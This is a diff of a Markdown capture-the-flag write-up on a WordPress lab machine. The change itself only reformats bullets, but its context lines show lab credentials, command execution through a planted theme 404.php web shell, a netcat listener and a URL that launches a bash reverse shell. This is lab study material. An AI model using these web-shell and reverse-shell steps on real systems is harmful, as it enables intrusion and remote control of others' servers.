@@ -36,7 +36,7 @@ This makes the scan faster and more reliable in lab environments.
 http://192.168.x.x/robots.txt
 ```
 
-**📌 Output:**
+- **📌 Output:**
 -
 ![1_3olegJiczAZe014yYac-JQ](https://github.com/user-attachments/assets/70966e8c-9e90-4ac5-abce-e5f5d06e5d7c)
 - **🏳️ Flag 1 Capture**
@@ -89,11 +89,11 @@ firefox http://192.168.194.7/wp-login.php &
 ```
 - This command opens the WordPress login page in Firefox from the terminal.
 It is useful when the login page is not easily discoverable through directory browsing.
-📌 Valid username identified (manual + context):
+- 📌 Valid username identified (manual + context):
 ```
 elliot
 ```
-📌 Valid password:
+- 📌 Valid password:
 ```
 ER28-0652
 ```
@@ -124,7 +124,7 @@ The output shows the current user context (daemon), verifying shell access.
 - 📌 Output:
 
 > uid=1(daemon) gid=1(daemon)
-🐚 Phase 6: Reverse Shell (WORKING METHOD)
+- 🐚 Phase 6: Reverse Shell (WORKING METHOD)
 - 1️⃣ Start listener
 ```
 nc -lvnp 4444
@@ -137,7 +137,7 @@ http://192.168.194.7/wp-content/themes/twentyfifteen/404.php?cmd=bash+-c+%27bash
 ```
  -This URL executes a bash reverse shell from the target to the attacker’s machine.
 Once triggered, it provides an interactive shell over the Netcat listener.
-📌 Shell obtained:
+- 📌 Shell obtained:
 ```
 /wordpress/htdocs/wp-content/themes/twentyfifteen$
 ```
